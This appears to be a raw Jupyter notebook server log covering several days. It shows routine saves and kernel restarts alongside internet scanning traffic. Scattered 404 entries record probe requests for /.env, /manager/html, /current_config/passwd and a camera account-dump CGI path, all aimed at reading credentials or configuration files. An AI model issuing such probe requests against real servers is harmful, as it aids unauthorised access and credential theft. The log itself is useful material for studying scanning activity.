+[I 07:53:56.884 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:53:57.676 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:54:56.846 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:55:16.689 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:57:16.645 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:57:59.248 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:59:16.703 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:01:16.676 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:03:16.616 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:04:13.164 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:04:50.183 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:05:16.641 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:05:30.020 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:09:17.413 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:17:16.610 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:19:10.321 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:20:03.896 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:20:27.106 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:21:16.647 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[W 08:23:10.890 NotebookApp] 404 GET /manager/html (58.216.199.202) 1.74ms referer=None
+[I 08:23:17.439 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:25:16.604 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:27:16.620 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:28:19.723 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:28:54.417 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:29:16.663 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:29:35.548 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:31:16.563 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:35:17.393 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:37:16.613 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:38:24.782 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:39:16.647 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:41:58.129 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:47:16.875 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:47:19.049 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:47:22.326 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:49:16.878 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:49:40.467 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:51:16.966 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:52:51.303 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:53:16.967 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:57:17.092 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:57:44.523 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:59:17.199 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:01:17.180 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:01:25.248 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:03:17.479 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:05:17.321 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:06:34.760 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:07:17.412 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:09:17.499 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:09:37.921 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:10:56.966 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:11:57.125 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:12:59.438 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:13:16.238 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:14:31.942 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:40:46.976 NotebookApp] 302 GET / (85.104.104.199) 0.66ms
+[W 11:24:22.421 NotebookApp] 404 GET /api/.env (193.232.106.88) 1.96ms referer=None
+[I 11:27:24.410 NotebookApp] 302 GET / (189.236.17.93) 0.66ms
+[I 11:36:29.228 NotebookApp] 302 GET / (103.201.142.185) 0.54ms
+[I 11:58:46.271 NotebookApp] 302 GET / (142.93.219.124) 0.86ms
+[W 14:03:31.768 NotebookApp] 404 GET /manager/html (58.216.199.202) 2.07ms referer=None
+[I 14:44:14.001 NotebookApp] 302 GET / (187.101.184.182) 0.61ms
+[I 14:55:09.429 NotebookApp] 302 GET / (213.81.220.53) 0.61ms
+[W 15:15:38.363 NotebookApp] 404 HEAD http://112.124.42.80:63435/ (60.191.52.254) 1.97ms referer=None
+[I 16:06:08.917 NotebookApp] 302 GET / (184.105.139.68) 0.62ms
+[I 16:29:37.387 NotebookApp] 302 GET / (189.18.193.151) 0.76ms
+[I 16:52:28.617 NotebookApp] 302 GET / (139.162.79.87) 0.60ms
+[I 16:57:56.350 NotebookApp] 302 GET / (62.1.30.82) 0.74ms
+[I 17:09:15.225 NotebookApp] 302 GET / (209.17.96.2) 0.73ms
+[I 17:19:46.316 NotebookApp] 302 GET / (200.75.196.10) 0.53ms
+[I 17:48:19.931 NotebookApp] 302 GET / (103.194.146.195) 0.58ms
+[I 18:11:17.375 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 18:19:47.393 NotebookApp] 302 GET / (171.100.25.108) 0.59ms
+[I 19:07:23.582 NotebookApp] 302 GET / (179.110.42.177) 0.71ms
+[I 20:06:59.153 NotebookApp] 302 GET / (202.89.64.26) 0.81ms
+[I 20:11:30.655 NotebookApp] 302 GET / (190.7.21.238) 0.62ms
+[W 20:19:00.926 NotebookApp] WebSocket ping timeout after 119800 ms.
+[I 21:23:34.323 NotebookApp] 302 GET / (164.160.141.216) 0.91ms
+[I 22:51:35.366 NotebookApp] 302 GET / (103.233.122.176) 0.68ms
+[I 01:11:51.754 NotebookApp] 302 GET / (177.200.26.217) 0.67ms
+[I 01:57:32.702 NotebookApp] 302 GET / (213.193.20.35) 0.72ms
+[I 04:44:15.895 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[W 05:08:15.897 NotebookApp] WebSocket ping timeout after 119955 ms.
+[I 05:55:40.890 NotebookApp] 302 GET / (213.92.237.176) 0.57ms
+[I 06:35:11.512 NotebookApp] 302 GET / (105.235.197.202) 0.80ms
+[I 07:00:47.392 NotebookApp] 302 GET / (190.186.58.249) 0.61ms
+[I 08:29:30.220 NotebookApp] 302 GET / (196.52.43.113) 0.70ms
+[I 09:25:13.861 NotebookApp] 302 GET / (74.82.47.2) 0.79ms
+[I 10:32:03.879 NotebookApp] 302 GET / (176.215.248.51) 0.98ms
+[I 10:35:31.682 NotebookApp] 302 GET / (177.67.8.33) 0.73ms
+[I 10:43:59.768 NotebookApp] 302 GET / (189.0.198.30) 0.61ms
+[I 11:27:16.319 NotebookApp] 302 GET / (85.97.129.80) 0.78ms
+[I 11:32:25.201 NotebookApp] 302 GET / (201.76.125.1) 0.57ms
+[I 14:19:19.383 NotebookApp] 302 GET / (198.108.66.176) 0.72ms
+[I 14:19:19.480 NotebookApp] 302 GET /tree? (198.108.66.176) 0.95ms
+[I 15:01:56.773 NotebookApp] 302 GET / (187.102.57.245) 0.68ms
+[I 15:42:51.498 NotebookApp] 302 GET / (189.46.40.139) 0.72ms
+[I 15:44:05.695 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 17:51:23.819 NotebookApp] 302 GET / (38.64.177.18) 0.72ms
+[I 17:52:16.350 NotebookApp] 302 GET / (40.76.31.94) 0.61ms
+[I 17:52:16.434 NotebookApp] 302 GET /tree? (40.76.31.94) 0.86ms
+[I 17:57:08.311 NotebookApp] 302 GET / (209.17.97.2) 0.65ms
+[I 19:03:45.271 NotebookApp] 302 GET / (177.105.225.108) 0.67ms
+[W 19:58:04.755 NotebookApp] 404 GET /.env (193.232.106.88) 1.87ms referer=None
+[W 20:55:05.696 NotebookApp] WebSocket ping timeout after 119968 ms.
+[I 21:27:18.128 NotebookApp] 302 GET / (77.120.30.8) 0.76ms
+[W 22:33:53.292 NotebookApp] 404 GET /manager/html (205.185.125.228) 2.01ms referer=None
+[I 22:33:53.293 NotebookApp] Malformed HTTP message from 205.185.125.228: Malformed HTTP request line
+[I 22:40:31.392 NotebookApp] 302 GET / (5.15.113.190) 0.57ms
+[I 22:46:55.514 NotebookApp] 302 GET / (36.90.25.188) 0.62ms
+[I 23:11:33.037 NotebookApp] 302 GET / (88.247.94.57) 0.62ms
+[I 23:24:31.041 NotebookApp] 302 GET / (189.18.160.140) 0.57ms
+[W 05:06:03.978 NotebookApp] 404 GET /manager/html (125.65.112.250) 1.84ms referer=None
+[W 05:55:49.867 NotebookApp] Couldn't authenticate WebSocket connection
+[W 05:55:49.869 NotebookApp] 403 GET /api/kernels/a5feccc7-f1d2-4221-928e-05f23b418f67/channels?session_id=9B58C6CA8A0F48598EAFA54322DB98E4 (80.254.184.33) 4.75ms referer=None
+[W 05:55:53.708 NotebookApp] Couldn't authenticate WebSocket connection
+[W 05:55:53.709 NotebookApp] 403 GET /api/kernels/a5feccc7-f1d2-4221-928e-05f23b418f67/channels?session_id=9B58C6CA8A0F48598EAFA54322DB98E4 (80.254.184.33) 3.45ms referer=None
+[W 05:55:58.570 NotebookApp] Couldn't authenticate WebSocket connection
+[W 05:55:58.572 NotebookApp] 403 GET /api/kernels/a5feccc7-f1d2-4221-928e-05f23b418f67/channels?session_id=9B58C6CA8A0F48598EAFA54322DB98E4 (80.254.184.33) 5.27ms referer=None
+[W 05:56:07.562 NotebookApp] Couldn't authenticate WebSocket connection
+[W 05:56:07.564 NotebookApp] 403 GET /api/kernels/a5feccc7-f1d2-4221-928e-05f23b418f67/channels?session_id=9B58C6CA8A0F48598EAFA54322DB98E4 (80.254.184.33) 3.66ms referer=None
+[W 05:56:24.452 NotebookApp] Couldn't authenticate WebSocket connection
+[W 05:56:24.454 NotebookApp] 403 GET /api/kernels/a5feccc7-f1d2-4221-928e-05f23b418f67/channels?session_id=9B58C6CA8A0F48598EAFA54322DB98E4 (80.254.184.33) 3.12ms referer=None
+[W 05:56:57.465 NotebookApp] Couldn't authenticate WebSocket connection
+[W 05:56:57.467 NotebookApp] 403 GET /api/kernels/a5feccc7-f1d2-4221-928e-05f23b418f67/channels?session_id=9B58C6CA8A0F48598EAFA54322DB98E4 (80.254.184.33) 3.66ms referer=None
+[W 05:58:02.475 NotebookApp] Couldn't authenticate WebSocket connection
+[W 05:58:02.478 NotebookApp] 403 GET /api/kernels/a5feccc7-f1d2-4221-928e-05f23b418f67/channels?session_id=9B58C6CA8A0F48598EAFA54322DB98E4 (80.254.184.33) 4.56ms referer=None
+[I 06:45:33.565 NotebookApp] 302 GET / (177.103.59.6) 0.62ms
+[I 06:47:12.981 NotebookApp] 302 GET / (60.191.38.77) 0.50ms
+[I 06:50:56.998 NotebookApp] 302 GET /tree? (60.191.38.77) 1.03ms
+[I 08:59:33.239 NotebookApp] 302 GET / (103.79.114.22) 0.88ms
+[I 09:27:11.990 NotebookApp] 302 GET / (54.185.154.75) 0.74ms
+[I 09:46:44.257 NotebookApp] 302 GET / (5.40.162.196) 0.78ms
+[I 10:28:55.005 NotebookApp] 302 GET / (123.145.23.0) 0.63ms
+[W 10:28:56.244 NotebookApp] 404 GET /home.asp (123.145.23.0) 1.95ms referer=None
+[I 10:28:57.434 NotebookApp] 302 GET / (123.145.23.0) 0.53ms
+[I 10:28:58.652 NotebookApp] 302 GET / (123.145.23.0) 0.48ms
+[W 10:28:59.876 NotebookApp] 404 GET /images/logo.gif (123.145.23.0) 2.21ms referer=None
+[W 10:29:01.059 NotebookApp] 404 GET /fdsrwe (123.145.23.0) 1.60ms referer=None
+[W 10:29:02.237 NotebookApp] 404 GET /qnfxcjqr (123.145.23.0) 1.72ms referer=None
+[W 10:29:03.509 NotebookApp] 404 GET /currentsetting.htm (123.145.23.0) 1.59ms referer=None
+[I 10:29:04.698 NotebookApp] 302 GET / (123.145.23.0) 0.56ms
+[W 10:29:05.913 NotebookApp] 404 GET /winbox.png (124.88.112.225) 1.46ms referer=None
+[W 10:29:07.184 NotebookApp] 404 GET /login.html (124.88.112.225) 1.60ms referer=None
+[W 10:29:08.485 NotebookApp] 404 GET /device_description.xml (124.88.112.225) 1.64ms referer=None
+[W 10:29:09.587 NotebookApp] 404 GET /cgi-bin/user/Config.cgi?.cab&action=get&category=Account.* (124.88.112.225) 1.61ms referer=None
+[W 10:29:10.685 NotebookApp] 404 GET /current_config/passwd (124.88.112.225) 1.51ms referer=None
+[I 10:29:11.792 NotebookApp] 302 GET / (124.88.112.225) 0.56ms
+[I 10:29:12.888 NotebookApp] 302 GET / (124.88.112.225) 0.50ms
+[I 10:29:13.418 NotebookApp] 302 GET / (124.88.112.225) 0.58ms
+[W 10:29:13.942 NotebookApp] 404 GET /cgi-bin/nobody/Machine.cgi?action=get_capability (124.88.112.225) 1.54ms referer=None
+[W 10:29:15.017 NotebookApp] 404 GET /index.asp (124.88.112.225) 1.55ms referer=None
+[I 10:53:20.415 NotebookApp] 302 GET / (78.158.143.25) 0.62ms
+[I 11:02:00.257 NotebookApp] 302 GET / (106.12.21.70) 0.73ms
+[I 11:02:02.466 NotebookApp] 302 GET /tree? (106.12.21.70) 1.01ms
+[I 11:04:09.147 NotebookApp] 302 GET / (201.26.53.70) 0.70ms
+[I 11:37:15.423 NotebookApp] 302 GET / (85.187.237.98) 0.60ms
+[I 12:07:43.056 NotebookApp] 302 GET / (36.37.122.203) 0.70ms
+[I 12:07:43.359 NotebookApp] 302 GET /tree? (36.37.122.203) 0.86ms
+[I 13:55:36.514 NotebookApp] 302 GET / (103.85.160.9) 0.87ms
+[I 16:35:27.631 NotebookApp] 302 GET / (181.177.142.166) 0.70ms
+[I 16:48:50.828 NotebookApp] 302 GET / (209.17.97.58) 0.84ms
+[I 17:04:42.312 NotebookApp] 302 GET / (216.218.206.68) 0.72ms
+[I 18:57:20.443 NotebookApp] 302 GET / (93.159.136.101) 0.86ms
+[I 20:14:23.365 NotebookApp] 302 GET / (109.94.113.226) 0.67ms
+[I 23:29:23.320 NotebookApp] 302 GET / (184.149.44.57) 0.66ms
+[I 00:46:31.171 NotebookApp] 302 GET / (187.72.69.67) 0.69ms
+[I 01:29:33.730 NotebookApp] 302 GET / (124.41.214.42) 0.74ms
+[I 02:15:44.987 NotebookApp] 302 GET / (108.224.113.130) 0.73ms
+[W 02:22:51.447 NotebookApp] 404 GET /manager/html (218.29.6.252) 2.36ms referer=None
+[I 03:04:34.907 NotebookApp] 302 GET / (79.107.194.211) 0.76ms
+[I 04:24:32.616 NotebookApp] 302 GET / (177.41.135.241) 0.65ms
+[I 04:30:51.462 NotebookApp] 302 GET / (188.227.16.28) 0.56ms
+[I 04:30:51.506 NotebookApp] 302 GET /tree? (188.227.16.28) 1.07ms
+[I 05:05:43.101 NotebookApp] 302 GET / (185.99.65.252) 0.71ms
+[I 05:48:13.449 NotebookApp] 302 GET / (5.1.78.32) 0.53ms
+[I 05:48:13.460 NotebookApp] 302 GET /tree? (5.1.78.32) 0.85ms
+[I 06:48:22.388 NotebookApp] 302 GET / (180.247.240.173) 0.67ms
+[I 08:09:53.205 NotebookApp] 302 GET / (94.73.223.66) 0.57ms
+[I 08:59:54.695 NotebookApp] 302 GET / (89.151.128.216) 0.82ms
+[I 10:21:52.852 NotebookApp] 302 GET / (164.52.24.170) 0.68ms
+[I 11:38:34.500 NotebookApp] 302 GET / (177.105.238.40) 0.69ms
+[I 11:54:47.959 NotebookApp] 302 GET / (91.226.167.29) 0.64ms
+[I 12:21:28.882 NotebookApp] 302 GET / (77.82.89.147) 0.73ms
+[I 12:39:48.005 NotebookApp] 302 GET / (212.115.248.230) 0.61ms
+[I 12:47:43.437 NotebookApp] 302 GET / (37.139.6.161) 0.58ms
+[I 13:36:15.227 NotebookApp] 302 GET / (216.218.206.67) 0.84ms
+[W 14:23:46.872 NotebookApp] 404 GET /manager/html (205.185.125.228) 1.91ms referer=None
+[I 14:23:46.873 NotebookApp] Malformed HTTP message from 205.185.125.228: Malformed HTTP request line
+[I 16:58:11.479 NotebookApp] 302 GET / (191.19.159.77) 0.85ms
+[I 17:04:45.874 NotebookApp] 302 GET / (36.72.216.54) 0.60ms
+[I 18:40:50.150 NotebookApp] 302 GET / (176.119.134.84) 0.65ms
+[I 19:46:23.789 NotebookApp] 302 GET / (177.102.45.29) 0.82ms
+[I 20:04:19.485 NotebookApp] 302 GET / (209.17.96.234) 0.80ms
+[W 20:54:46.827 NotebookApp] 404 GET //Graphics/Tropical/styles.css (77.247.108.37) 2.01ms referer=None
+[W 20:54:46.829 NotebookApp] 404 GET //a2billing/admin/Public/PP_error.php?c=accessdenied (77.247.108.37) 1.13ms referer=None
+[I 20:54:46.921 NotebookApp] 302 GET //webfig/ (77.247.108.37) 0.47ms
+[I 20:54:46.933 NotebookApp] 302 GET //Login/ (77.247.108.37) 0.52ms
+[I 21:39:39.981 NotebookApp] 302 GET / (191.17.136.180) 0.76ms
+[W 23:02:08.801 NotebookApp] 404 GET /manager/html (122.112.197.81) 2.46ms referer=None
+[I 23:02:31.638 NotebookApp] 302 GET / (186.208.23.227) 0.57ms
+[I 23:29:38.739 NotebookApp] 302 GET / (201.150.151.211) 0.65ms
+[I 01:16:18.301 NotebookApp] 302 GET / (109.94.119.175) 0.62ms
+[I 02:29:11.651 NotebookApp] 302 GET / (139.162.79.87) 0.74ms
+[I 04:36:23.118 NotebookApp] 302 GET / (77.247.109.245) 0.65ms
+[I 05:16:23.928 NotebookApp] 302 GET / (177.139.111.161) 0.67ms
+[I 05:36:10.342 NotebookApp] 302 GET / (178.212.94.17) 0.70ms
+[I 05:40:54.201 NotebookApp] 302 GET / (88.226.184.178) 0.65ms
+[W 06:02:01.376 NotebookApp] None
+[W 06:02:01.377 NotebookApp] 403 POST /api/kernels/a5feccc7-f1d2-4221-928e-05f23b418f67/restart (80.254.184.33) 1.72ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/sparqlwrapper.testing.ipynb
+[W 06:02:01.456 NotebookApp] None
+[W 06:02:01.456 NotebookApp] 403 DELETE /api/sessions/ff15ca28-6d85-43b3-b1cf-521584af6f53 (80.254.184.33) 1.44ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/sparqlwrapper.testing.ipynb
+[W 06:02:01.506 NotebookApp] None
+[W 06:02:01.507 NotebookApp] 403 POST /api/sessions (80.254.184.33) 1.60ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/sparqlwrapper.testing.ipynb
+[I 06:02:12.518 NotebookApp] 302 GET /notebooks/data_analysis/sparqlwrapper.testing.ipynb (80.254.184.33) 1.11ms
+[I 06:02:12.531 NotebookApp] 302 GET /api/contents/data_analysis/sparqlwrapper.testing.ipynb?content=0&_=1557220360677 (80.254.184.33) 1.23ms
+[I 06:02:15.001 NotebookApp] 302 POST /login?next=%2Fnotebooks%2Fdata_analysis%2Fsparqlwrapper.testing.ipynb (80.254.184.33) 2.06ms
+[W 06:02:16.016 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20190411101624 (80.254.184.33) 1.47ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/sparqlwrapper.testing.ipynb
+[I 06:02:19.447 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:02:30.383 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:02:31.304 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:03:38.175 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:03:38.991 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:04:20.020 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:06:19.794 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[W 06:11:26.697 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20190411101624 (80.254.184.33) 2.08ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/sparqlwrapper.testing.ipynb
+[I 06:11:33.054 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:11:44.782 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:11:45.711 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:13:33.002 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:15:33.003 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:17:32.975 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:19:32.989 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:20:07.461 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:20:46.768 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:21:12.432 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:21:13.232 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:21:33.063 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:23:17.293 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[W 06:23:22.864 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20190411101624 (80.254.184.33) 2.20ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/sparqlwrapper.testing.ipynb
+[I 06:23:26.779 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:23:41.168 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:23:42.020 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:25:26.921 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:27:10.841 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:27:26.926 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:27:56.949 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:27:58.082 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 06:28:11.152 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 06:49:17.568 NotebookApp] 302 GET / (85.105.243.131) 0.72ms
+[I 07:07:27.396 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:09:27.157 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:11:27.115 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:13:27.068 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:14:01.500 NotebookApp] 302 GET / (184.105.247.252) 0.49ms
+[I 07:15:27.105 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:17:27.092 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:19:27.037 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:19:49.230 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:21:27.077 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:46:15.892 NotebookApp] 302 GET / (179.111.197.247) 0.76ms
